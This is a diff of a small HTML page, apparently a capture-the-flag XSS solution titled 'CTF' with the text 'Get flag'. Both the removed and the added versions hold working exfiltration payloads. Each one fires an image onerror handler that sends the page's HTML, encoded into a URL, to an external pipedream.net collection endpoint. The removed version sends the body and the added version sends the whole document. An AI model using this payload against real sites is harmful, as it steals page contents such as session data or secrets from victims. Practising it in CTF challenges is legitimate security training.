@@ -3,21 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test 1</title>
+    <title>CTF</title>
 </head>
 <body>
     <p>Get flag</p>
-    <img src="#" id="secretTrigger" style="display:none;">
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            var imgElement = document.getElementById('secretTrigger');
-            imgElement.onerror = function() {
-                var bodyContent = document.body.innerHTML;
-                var targetURL = "https://eo8bzrb9y2mj48v.m.pipedream.net?";
-                fetch(targetURL + encodeURIComponent(bodyContent));
-            };
-            imgElement.src = "invalid.jpg"; // Triggering the error intentionally
-        });
+        document.querySelector("body").innerHTML += `<img src=none onerror="this.src='https://eo8bzrb9y2mj48v.m.pipedream.net?' + encodeURIComponent(document.documentElement.outerHTML); this.onerror=null;">`;
     </script>
 </body>
 </html>
